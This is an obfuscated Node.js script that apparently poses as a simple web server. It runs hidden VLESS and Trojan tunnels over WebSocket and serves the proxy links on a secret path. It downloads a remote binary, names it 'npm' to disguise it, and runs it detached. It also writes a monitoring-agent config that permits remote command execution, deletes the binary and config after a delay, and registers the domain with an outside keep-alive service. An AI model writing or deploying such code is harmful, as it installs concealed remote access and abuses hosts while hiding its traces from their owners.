const _0x4cb5a0=_0x39f2;(function(_0x2226be,_0x32bf03){const _0x6e0120=_0x39f2,_0x52f38c=_0x2226be();while(!![]){try{const _0x3bb818=-parseInt(_0x6e0120(0x223))/0x1*(parseInt(_0x6e0120(0x1f5))/0x2)+parseInt(_0x6e0120(0x222))/0x3+-parseInt(_0x6e0120(0x1fc))/0x4+-parseInt(_0x6e0120(0x225))/0x5*(parseInt(_0x6e0120(0x228))/0x6)+parseInt(_0x6e0120(0x211))/0x7+-parseInt(_0x6e0120(0x218))/0x8+parseInt(_0x6e0120(0x1d3))/0x9;if(_0x3bb818===_0x32bf03)break;else _0x52f38c['push'](_0x52f38c['shift']());}catch(_0x91fd69){_0x52f38c['push'](_0x52f38c['shift']());}}}(_0x3547,0x82300));function _0x3547(){const _0x361312=['find','369366VgfVIx','&path=%2F','createServer','catch','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','/bin/bash','arm64','get','readFile','message','Unknown','axios','setsid\x20nohup\x20./npm\x20-s\x20','Automatic\x20Access\x20Task\x20added\x20successfully','npm\x20running\x20error:','37de68e7-108d-4908-9a1b-85979e8431ce','type','update','true','log','unlink','error','once','url','Server\x20is\x20running\x20on\x20port\x20','https://api.ip.sb/geoip','238194Znrlvv','https://dns.google/resolve?name=','false','chmod\x20+x\x20npm','readUInt8','path','config.yaml','sub','index.html','npm\x20is\x20running','https://arm64.ssss.nyc.mn/v1','createWriteStream','net','text/plain','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','--tls','arch','write','base64','pipe','Hello\x20world!','then','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-p\x20','https://arm64.ssss.nyc.mn/agent','close','replace','writeHead','&fp=chrome&type=ws&host=','send','sha224','Answer','aarch64','Server','156536mqaxNR','finish','join','concat','from','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','end','474708LqlNzD','includes','listen','map','text/html','crypto','connect','Failed\x20to\x20resolve\x20','&type=A','pop','application/json','2053','trim','substr','child_process','client_secret:\x20','length',':443?encryption=none&security=tls&sni=','data','utf-8','slice','2811844giWqny','decode','post','1234.abc.com','https://amd64.ssss.nyc.mn/v1','Status','npm','4177576TanhuH',':443?security=tls&sni=','digest','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','http','toString','every','readUInt16BE','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://','3026745FXqesr','1KSIXCf','1.1.1.1','15hRLitn','application/dns-json'];_0x3547=function(){return _0x361312;};return _0x3547();}const os=require('os'),http=require(_0x4cb5a0(0x21c)),fs=require('fs'),axios=require(_0x4cb5a0(0x1c4)),net=require(_0x4cb5a0(0x1df)),path=require(_0x4cb5a0(0x1d8)),crypto=require(_0x4cb5a0(0x201)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x4cb5a0(0x20a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x4cb5a0(0x1c8),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x4cb5a0(0x214),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x4cb5a0(0x210)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x4cb5a0(0x1da),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;function _0x39f2(_0x93f144,_0xefccce){_0x93f144=_0x93f144-0x1bd;const _0x3547ad=_0x3547();let _0x39f2ef=_0x3547ad[_0x93f144];return _0x39f2ef;}let ISP='';const GetISP=async()=>{const _0x4f4ff9=_0x4cb5a0;try{const _0x487401=await axios[_0x4f4ff9(0x1c0)](_0x4f4ff9(0x1d2)),_0x1b8500=_0x487401[_0x4f4ff9(0x20e)];ISP=(_0x1b8500['country_code']+'-'+_0x1b8500['isp'])[_0x4f4ff9(0x1ed)](/ /g,'_');}catch(_0x4a4add){ISP=_0x4f4ff9(0x1c3);}};GetISP();const httpServer=http[_0x4cb5a0(0x22a)]((_0x46ea08,_0x1cc379)=>{const _0x3a7c2b=_0x4cb5a0;if(_0x46ea08[_0x3a7c2b(0x1d0)]==='/'){const _0x4ee908=path[_0x3a7c2b(0x1f7)](__dirname,_0x3a7c2b(0x1db));fs[_0x3a7c2b(0x1c1)](_0x4ee908,'utf8',(_0x26774b,_0x5ca628)=>{const _0x2af8b7=_0x3a7c2b;if(_0x26774b){_0x1cc379[_0x2af8b7(0x1ee)](0xc8,{'Content-Type':_0x2af8b7(0x200)}),_0x1cc379[_0x2af8b7(0x1fb)](_0x2af8b7(0x1e7));return;}_0x1cc379['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x1cc379['end'](_0x5ca628);});return;}else{if(_0x46ea08[_0x3a7c2b(0x1d0)]==='/'+SUB_PATH){const _0x6c5a95=NAME?NAME+'-'+ISP:ISP,_0x250ed0='vless://'+UUID+'@'+DOMAIN+_0x3a7c2b(0x20d)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x6c5a95,_0x3db687='trojan://'+UUID+'@'+DOMAIN+_0x3a7c2b(0x219)+DOMAIN+_0x3a7c2b(0x1ef)+DOMAIN+_0x3a7c2b(0x229)+WSPATH+'#'+_0x6c5a95,_0x546647=_0x250ed0+'\x0a'+_0x3db687,_0x2127c6=Buffer[_0x3a7c2b(0x1f9)](_0x546647)[_0x3a7c2b(0x21d)](_0x3a7c2b(0x1e5));_0x1cc379[_0x3a7c2b(0x1ee)](0xc8,{'Content-Type':_0x3a7c2b(0x1e0)}),_0x1cc379['end'](_0x2127c6+'\x0a');}else _0x1cc379[_0x3a7c2b(0x1ee)](0x194,{'Content-Type':_0x3a7c2b(0x1e0)}),_0x1cc379[_0x3a7c2b(0x1fb)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x4cb5a0(0x1f4))]({'server':httpServer}),uuid=UUID[_0x4cb5a0(0x1ed)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4cb5a0(0x224)];function resolveHost(_0x473904){return new Promise((_0x10adce,_0x32c555)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x473904)){_0x10adce(_0x473904);return;}let _0x13752f=0x0;function _0x36ad6f(){const _0x139918=_0x39f2;if(_0x13752f>=DNS_SERVERS[_0x139918(0x20c)]){_0x32c555(new Error(_0x139918(0x203)+_0x473904+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4796a5=DNS_SERVERS[_0x13752f];_0x13752f++;const _0x15f149=_0x139918(0x1d4)+encodeURIComponent(_0x473904)+_0x139918(0x204);axios[_0x139918(0x1c0)](_0x15f149,{'timeout':0x1388,'headers':{'Accept':_0x139918(0x226)}})[_0x139918(0x1e8)](_0x5c1714=>{const _0x21fabc=_0x139918,_0x36fc89=_0x5c1714[_0x21fabc(0x20e)];if(_0x36fc89[_0x21fabc(0x216)]===0x0&&_0x36fc89[_0x21fabc(0x1f2)]&&_0x36fc89[_0x21fabc(0x1f2)]['length']>0x0){const _0xd2b7a2=_0x36fc89[_0x21fabc(0x1f2)][_0x21fabc(0x227)](_0x309087=>_0x309087[_0x21fabc(0x1c9)]===0x1);if(_0xd2b7a2){_0x10adce(_0xd2b7a2[_0x21fabc(0x20e)]);return;}}_0x36ad6f();})[_0x139918(0x22b)](_0x5ce756=>{_0x36ad6f();});}_0x36ad6f();});}function handleVlessConnection(_0x45a43d,_0x386eb7){const _0x1d8a87=_0x4cb5a0,[_0x4a916b]=_0x386eb7,_0x11028c=_0x386eb7[_0x1d8a87(0x210)](0x1,0x11);if(!_0x11028c[_0x1d8a87(0x21e)]((_0x244a0d,_0x38875b)=>_0x244a0d==parseInt(uuid[_0x1d8a87(0x209)](_0x38875b*0x2,0x2),0x10)))return![];let _0x17ba9d=_0x386eb7['slice'](0x11,0x12)[_0x1d8a87(0x1d7)]()+0x13;const _0xfde0d7=_0x386eb7[_0x1d8a87(0x210)](_0x17ba9d,_0x17ba9d+=0x2)[_0x1d8a87(0x21f)](0x0),_0x4922b3=_0x386eb7['slice'](_0x17ba9d,_0x17ba9d+=0x1)[_0x1d8a87(0x1d7)](),_0x347d2d=_0x4922b3==0x1?_0x386eb7[_0x1d8a87(0x210)](_0x17ba9d,_0x17ba9d+=0x4)[_0x1d8a87(0x1f7)]('.'):_0x4922b3==0x2?new TextDecoder()[_0x1d8a87(0x212)](_0x386eb7['slice'](_0x17ba9d+0x1,_0x17ba9d+=0x1+_0x386eb7[_0x1d8a87(0x210)](_0x17ba9d,_0x17ba9d+0x1)[_0x1d8a87(0x1d7)]())):_0x4922b3==0x3?_0x386eb7['slice'](_0x17ba9d,_0x17ba9d+=0x10)['reduce']((_0x1a9578,_0x24b12c,_0x144e7e,_0x2ae074)=>_0x144e7e%0x2?_0x1a9578['concat'](_0x2ae074[_0x1d8a87(0x210)](_0x144e7e-0x1,_0x144e7e+0x1)):_0x1a9578,[])[_0x1d8a87(0x1ff)](_0x157e42=>_0x157e42[_0x1d8a87(0x21f)](0x0)[_0x1d8a87(0x21d)](0x10))[_0x1d8a87(0x1f7)](':'):'';_0x45a43d[_0x1d8a87(0x1f0)](new Uint8Array([_0x4a916b,0x0]));const _0x4c3edd=createWebSocketStream(_0x45a43d);return resolveHost(_0x347d2d)[_0x1d8a87(0x1e8)](_0x3f0f54=>{const _0x3981f4=_0x1d8a87;net['connect']({'host':_0x3f0f54,'port':_0xfde0d7},function(){const _0xe517d0=_0x39f2;this['write'](_0x386eb7['slice'](_0x17ba9d)),_0x4c3edd['on'](_0xe517d0(0x1ce),()=>{})[_0xe517d0(0x1e6)](this)['on']('error',()=>{})[_0xe517d0(0x1e6)](_0x4c3edd);})['on'](_0x3981f4(0x1ce),()=>{});})[_0x1d8a87(0x22b)](_0x10a300=>{const _0x2b4f11=_0x1d8a87;net[_0x2b4f11(0x202)]({'host':_0x347d2d,'port':_0xfde0d7},function(){const _0x4ac14e=_0x2b4f11;this[_0x4ac14e(0x1e4)](_0x386eb7[_0x4ac14e(0x210)](_0x17ba9d)),_0x4c3edd['on'](_0x4ac14e(0x1ce),()=>{})[_0x4ac14e(0x1e6)](this)['on']('error',()=>{})['pipe'](_0x4c3edd);})['on'](_0x2b4f11(0x1ce),()=>{});}),!![];}function handleTrojanConnection(_0x30f175,_0x3571b7){const _0x523300=_0x4cb5a0;try{if(_0x3571b7[_0x523300(0x20c)]<0x3a)return![];const _0x534fed=_0x3571b7[_0x523300(0x210)](0x0,0x38)[_0x523300(0x21d)](),_0x133254=[UUID];let _0x4cc80f=null;for(const _0x12cd8a of _0x133254){const _0x3c2ef8=crypto['createHash'](_0x523300(0x1f1))[_0x523300(0x1ca)](_0x12cd8a)[_0x523300(0x21a)]('hex');if(_0x3c2ef8===_0x534fed){_0x4cc80f=_0x12cd8a;break;}}if(!_0x4cc80f)return![];let _0xf7e81=0x38;_0x3571b7[_0xf7e81]===0xd&&_0x3571b7[_0xf7e81+0x1]===0xa&&(_0xf7e81+=0x2);const _0x393c30=_0x3571b7[_0xf7e81];if(_0x393c30!==0x1)return![];_0xf7e81+=0x1;const _0x38e701=_0x3571b7[_0xf7e81];_0xf7e81+=0x1;let _0x4f9012,_0x41fb59;if(_0x38e701===0x1)_0x4f9012=_0x3571b7['slice'](_0xf7e81,_0xf7e81+0x4)[_0x523300(0x1f7)]('.'),_0xf7e81+=0x4;else{if(_0x38e701===0x3){const _0x5774d3=_0x3571b7[_0xf7e81];_0xf7e81+=0x1,_0x4f9012=_0x3571b7[_0x523300(0x210)](_0xf7e81,_0xf7e81+_0x5774d3)[_0x523300(0x21d)](),_0xf7e81+=_0x5774d3;}else{if(_0x38e701===0x4)_0x4f9012=_0x3571b7[_0x523300(0x210)](_0xf7e81,_0xf7e81+0x10)['reduce']((_0x345eb2,_0x259ee0,_0x4ebcc5,_0x370e26)=>_0x4ebcc5%0x2?_0x345eb2[_0x523300(0x1f8)](_0x370e26[_0x523300(0x210)](_0x4ebcc5-0x1,_0x4ebcc5+0x1)):_0x345eb2,[])['map'](_0x1e123e=>_0x1e123e[_0x523300(0x21f)](0x0)['toString'](0x10))[_0x523300(0x1f7)](':'),_0xf7e81+=0x10;else return![];}}_0x41fb59=_0x3571b7[_0x523300(0x21f)](_0xf7e81),_0xf7e81+=0x2;_0xf7e81<_0x3571b7['length']&&_0x3571b7[_0xf7e81]===0xd&&_0x3571b7[_0xf7e81+0x1]===0xa&&(_0xf7e81+=0x2);const _0x43cc19=createWebSocketStream(_0x30f175);return resolveHost(_0x4f9012)[_0x523300(0x1e8)](_0x579854=>{net['connect']({'host':_0x579854,'port':_0x41fb59},function(){const _0x56c564=_0x39f2;_0xf7e81<_0x3571b7[_0x56c564(0x20c)]&&this[_0x56c564(0x1e4)](_0x3571b7[_0x56c564(0x210)](_0xf7e81)),_0x43cc19['on'](_0x56c564(0x1ce),()=>{})[_0x56c564(0x1e6)](this)['on'](_0x56c564(0x1ce),()=>{})['pipe'](_0x43cc19);})['on']('error',()=>{});})[_0x523300(0x22b)](_0x21f9df=>{const _0x17277c=_0x523300;net[_0x17277c(0x202)]({'host':_0x4f9012,'port':_0x41fb59},function(){const _0x2522bd=_0x17277c;_0xf7e81<_0x3571b7[_0x2522bd(0x20c)]&&this['write'](_0x3571b7[_0x2522bd(0x210)](_0xf7e81)),_0x43cc19['on'](_0x2522bd(0x1ce),()=>{})[_0x2522bd(0x1e6)](this)['on'](_0x2522bd(0x1ce),()=>{})[_0x2522bd(0x1e6)](_0x43cc19);})['on'](_0x17277c(0x1ce),()=>{});}),!![];}catch(_0x2622ec){return![];}}wss['on']('connection',(_0x31ed36,_0xab5a4c)=>{const _0x2b5c10=_0x4cb5a0,_0xf311e7=_0xab5a4c[_0x2b5c10(0x1d0)]||'';_0x31ed36[_0x2b5c10(0x1cf)](_0x2b5c10(0x1c2),_0x44af74=>{const _0x76fdcc=_0x2b5c10;if(_0x44af74[_0x76fdcc(0x20c)]>0x11&&_0x44af74[0x0]===0x0){const _0x40f428=_0x44af74[_0x76fdcc(0x210)](0x1,0x11),_0x2dab48=_0x40f428[_0x76fdcc(0x21e)]((_0x51c489,_0x36ec5d)=>_0x51c489==parseInt(uuid[_0x76fdcc(0x209)](_0x36ec5d*0x2,0x2),0x10));if(_0x2dab48){!handleVlessConnection(_0x31ed36,_0x44af74)&&_0x31ed36['close']();return;}}!handleTrojanConnection(_0x31ed36,_0x44af74)&&_0x31ed36[_0x76fdcc(0x1ec)]();})['on'](_0x2b5c10(0x1ce),()=>{});});const getDownloadUrl=()=>{const _0x326ac3=_0x4cb5a0,_0x2d2aca=os[_0x326ac3(0x1e3)]();return _0x2d2aca==='arm'||_0x2d2aca===_0x326ac3(0x1bf)||_0x2d2aca===_0x326ac3(0x1f3)?!NEZHA_PORT?_0x326ac3(0x1dd):_0x326ac3(0x1eb):!NEZHA_PORT?_0x326ac3(0x215):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x586e86=_0x4cb5a0;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x59c309=getDownloadUrl(),_0x4231cf=await axios({'method':_0x586e86(0x1c0),'url':_0x59c309,'responseType':'stream'}),_0x3f3215=fs[_0x586e86(0x1de)]('npm');return _0x4231cf[_0x586e86(0x20e)][_0x586e86(0x1e6)](_0x3f3215),new Promise((_0x2f97b8,_0x2d5300)=>{const _0x258176=_0x586e86;_0x3f3215['on'](_0x258176(0x1f6),()=>{const _0x45cb5d=_0x258176;console[_0x45cb5d(0x1cc)](_0x45cb5d(0x1bd)),exec(_0x45cb5d(0x1d6),_0x3a82f2=>{if(_0x3a82f2)_0x2d5300(_0x3a82f2);_0x2f97b8();});}),_0x3f3215['on'](_0x258176(0x1ce),_0x2d5300);});}catch(_0xcabdab){throw _0xcabdab;}},runnz=async()=>{const _0x147556=_0x4cb5a0;try{const _0x19a440=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x147556(0x20f)});if(_0x19a440[_0x147556(0x208)]()!==''){console[_0x147556(0x1cc)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x264efc){}await downloadFile();let _0x6509b8='',_0x5c1391=['443','8443','2096','2087','2083',_0x147556(0x207)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5930be=_0x5c1391[_0x147556(0x1fd)](NEZHA_PORT)?_0x147556(0x1e2):'';_0x6509b8=_0x147556(0x1c5)+NEZHA_SERVER+':'+NEZHA_PORT+_0x147556(0x1ea)+NEZHA_KEY+'\x20'+_0x5930be+_0x147556(0x1e9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4ccea0=NEZHA_SERVER[_0x147556(0x1fd)](':')?NEZHA_SERVER['split'](':')[_0x147556(0x205)]():'',_0x58b1d0=_0x5c1391['includes'](_0x4ccea0)?_0x147556(0x1cb):_0x147556(0x1d5),_0x1f6c4c=_0x147556(0x20b)+NEZHA_KEY+_0x147556(0x1fa)+NEZHA_SERVER+_0x147556(0x220)+_0x58b1d0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x147556(0x1d9),_0x1f6c4c);}_0x6509b8=_0x147556(0x1e1);}else{console[_0x147556(0x1cc)](_0x147556(0x21b));return;}}try{exec(_0x6509b8,{'shell':_0x147556(0x1be)},_0x4296ef=>{const _0x11cafe=_0x147556;if(_0x4296ef)console['error'](_0x11cafe(0x1c7),_0x4296ef);else console['log'](_0x11cafe(0x1dc));});}catch(_0xa57d79){console[_0x147556(0x1ce)]('error:\x20'+_0xa57d79);}};async function addAccessTask(){const _0x536597=_0x4cb5a0;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x333fc0=_0x536597(0x221)+DOMAIN;try{const _0x21c916=await axios[_0x536597(0x213)](_0x536597(0x22c),{'url':_0x333fc0},{'headers':{'Content-Type':_0x536597(0x206)}});console[_0x536597(0x1cc)](_0x536597(0x1c6));}catch(_0x1a7ed3){}}const delFiles=()=>{const _0x575f6c=_0x4cb5a0;fs[_0x575f6c(0x1cd)](_0x575f6c(0x217),()=>{}),fs[_0x575f6c(0x1cd)](_0x575f6c(0x1d9),()=>{});};httpServer[_0x4cb5a0(0x1fe)](PORT,()=>{const _0x32ad47=_0x4cb5a0;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x32ad47(0x1cc)](_0x32ad47(0x1d1)+PORT);});
